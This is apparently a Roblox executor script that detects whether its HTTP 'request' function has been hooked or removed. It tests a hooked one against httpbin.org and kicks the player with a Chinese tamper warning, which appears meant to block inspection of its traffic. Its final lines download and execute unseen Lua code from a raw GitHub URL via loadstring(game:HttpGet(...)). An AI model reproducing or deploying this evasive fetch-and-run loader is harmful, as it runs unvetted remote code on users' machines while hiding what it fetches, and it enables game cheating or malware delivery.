local Players = game:GetService("Players")
local RunService = game:GetService("RunService")

local LP = Players.LocalPlayer
local genv = getgenv and getgenv() or _G

local originalRequest = genv.request or rawget(_G, "request")

if not originalRequest then
    return
end

local alreadyKicked = false
local requestChanged = false

local function kickSuspicious(reason)
    if alreadyKicked then return end
    alreadyKicked = true
    pcall(function()
        LP:Kick("\n检测到网络请求函数 (request) 被恶意篡改或拦截\n原因: " .. reason .. "\n错误码: 267")
    end)
end

RunService.Heartbeat:Connect(function()
    if alreadyKicked then return end

    local liveRequest = genv.request or rawget(_G, "request")

    if not liveRequest then
        kickSuspicious("request函数被删除或隐藏")
        return
    end

    if liveRequest ~= originalRequest then
        requestChanged = true
    end

    if requestChanged and liveRequest then
        task.spawn(function()
            local testUrl = "https://httpbin.org/get"
            local ok, res = pcall(function()
                return liveRequest({Url = testUrl, Method = "GET"})
            end)

            if not ok or not res or not res.StatusCode or res.StatusCode ~= 200 then
                kickSuspicious("请求拦截异常")
            end

            requestChanged = false
        end)
    end
end)

pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/qwrt5589/eododo/244a680e45f8277980d956df250224611dbdea41/46.lua"))()
end)